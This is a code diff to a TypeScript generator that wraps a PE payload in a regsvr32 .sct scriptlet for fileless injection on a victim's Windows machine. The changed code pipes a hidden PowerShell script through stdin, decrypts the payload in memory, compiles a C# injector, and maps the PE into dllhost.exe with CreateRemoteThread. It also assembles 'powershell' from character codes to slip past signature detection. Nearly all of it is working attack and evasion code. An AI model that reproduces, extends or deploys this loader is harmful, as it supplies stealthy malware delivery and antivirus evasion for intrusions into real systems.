@@ -8,15 +8,14 @@
  *
  * Execution chain on victim:
  *   1. regsvr32.exe loads scrobj.dll and parses the .sct XML
- *   2. JScript in <script> element sets env vars with payload + C# source
- *   3. WScript.Shell launches PowerShell hidden
- *   4. PS decrypts XOR+gzip payload from env var base64 in memory
- *   5. C# P/Invoke injector compiled via Add-Type (random class name per build)
- *   6. dllhost.exe started hidden (LOTL — COM Surrogate, always present, low suspicion)
- *   7. PE manually mapped into dllhost via VirtualAllocEx + WriteProcessMemory
- *   8. Relocations + imports resolved remotely
- *   9. CreateRemoteThread at PE entry point
- *  10. Agent runs inside dllhost.exe — no files on disk
+ *   2. JScript uses WScript.Shell.Exec to pipe PS script via stdin
+ *   3. PowerShell decrypts XOR+gzip payload from piped base64 in memory
+ *   4. C# P/Invoke injector compiled via Add-Type (random class name per build)
+ *   5. dllhost.exe started hidden (LOTL — COM Surrogate, always present, low suspicion)
+ *   6. PE manually mapped into dllhost via VirtualAllocEx + WriteProcessMemory
+ *   7. Relocations + imports resolved remotely
+ *   8. CreateRemoteThread at PE entry point
+ *   9. Agent runs inside dllhost.exe — no files on disk
  */
 
 import { v4 as uuidv4 } from "uuid";
@@ -30,6 +29,7 @@ import {
 
 /**
  * Generate a self-contained .sct file with fileless PE injection.
+ * Uses stdin piping to avoid the 32K Windows environment variable limit.
  * Returns the full SCT content as a string.
  */
 export function wrapPeAsSct(peBytes: Buffer): string {
@@ -39,49 +39,49 @@ export function wrapPeAsSct(peBytes: Buffer): string {
   const csharpCode = buildCSharpInjector(className);
   const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");
 
-  // PS reads payload + C# from environment variables set by JScript
-  const psLines = [
-    `$d=[Convert]::FromBase64String($env:_SCT_D)`,
-    `$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:_SCT_CS))`,
-  ];
-
+  // Build PS injection chain
   const chain = buildPsInjectionChain("$d", "$cs", className, "dllhost.exe");
-  const psScript = psLines.join(";") + ";" + chain;
-  const psEnc = Buffer.from(psScript, "utf16le").toString("base64");
 
-  const rnd = randHex(6);
-  const classId = uuidv4();
-  const progId = `Xp.${randClassName(6)}`;
+  // Escape chain for JScript double-quoted strings: \ → \\, " → \"
+  const chainJs = chain.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
 
-  // JScript payload — sets env vars and launches PS
-  // Split base64 across multiple assignments to stay under script engine limits
+  // Split base64 into chunks for multiple JScript StdIn.Write calls
   const chunkSize = 4000;
   const payloadChunks = b64Payload.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [b64Payload];
   const csChunks = csB64.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [csB64];
 
+  // Prefix with letter to ensure valid JScript identifiers
+  const rnd = "v" + randHex(5);
+  const classId = uuidv4();
+  const progId = `Xp.${randClassName(6)}`;
+
+  // JScript payload — pipes full PS script via stdin (no env var size limits)
   const jsLines: string[] = [];
   jsLines.push(`var ${rnd}s=new ActiveXObject("WScript.Shell");`);
-  jsLines.push(`var ${rnd}e=${rnd}s.Environment("Process");`);
-
-  // Build payload base64
-  jsLines.push(`var ${rnd}d="${payloadChunks[0]}";`);
-  for (let i = 1; i < payloadChunks.length; i++) {
-    jsLines.push(`${rnd}d+="${payloadChunks[i]}";`);
-  }
-  jsLines.push(`${rnd}e("_SCT_D")=${rnd}d;`);
-
-  // Build C# base64
-  jsLines.push(`var ${rnd}c="${csChunks[0]}";`);
-  for (let i = 1; i < csChunks.length; i++) {
-    jsLines.push(`${rnd}c+="${csChunks[i]}";`);
-  }
-  jsLines.push(`${rnd}e("_SCT_CS")=${rnd}c;`);
 
   // Reassemble "powershell" from char codes to avoid static signatures
   jsLines.push(`var ${rnd}p=String.fromCharCode(112,111,119,101,114,115,104,101,108,108);`);
 
-  // Launch PS hidden (0 = hidden window)
-  jsLines.push(`${rnd}s.Run(${rnd}p+" -nop -w h -ep b -enc ${psEnc}",0,false);`);
+  // Exec gives us StdIn access; "-" tells PS to read from stdin
+  jsLines.push(`var ${rnd}x=${rnd}s.Exec(${rnd}p+" -nop -w h -ep b -");`);
+
+  // Pipe PS script to stdin in chunks — payload decode
+  jsLines.push(`${rnd}x.StdIn.Write("$d=[Convert]::FromBase64String('");`);
+  for (const chunk of payloadChunks) {
+    jsLines.push(`${rnd}x.StdIn.Write("${chunk}");`);
+  }
+  jsLines.push(`${rnd}x.StdIn.Write("');");`);
+
+  // Pipe C# source decode
+  jsLines.push(`${rnd}x.StdIn.Write("$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('");`);
+  for (const chunk of csChunks) {
+    jsLines.push(`${rnd}x.StdIn.Write("${chunk}");`);
+  }
+  jsLines.push(`${rnd}x.StdIn.Write("'));");`);
+
+  // Pipe injection chain (backslashes and quotes escaped for JScript)
+  jsLines.push(`${rnd}x.StdIn.Write("${chainJs}");`);
+  jsLines.push(`${rnd}x.StdIn.Close();`);
 
   const jsScript = jsLines.join("\n");
 
